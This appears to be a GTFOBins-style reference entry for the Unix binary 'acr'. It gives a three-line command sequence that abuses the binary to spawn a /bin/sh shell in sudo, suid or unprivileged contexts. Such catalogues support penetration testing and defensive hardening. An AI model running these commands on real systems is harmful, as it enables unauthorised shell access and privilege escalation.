---
type: gtfobin
name: acr
platform: Unix
functions: [command]
tags: [gtfobin, unix, lotl]
---

# acr

## command

```bash
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file
```
**Contexts:** sudo, suid, unprivileged
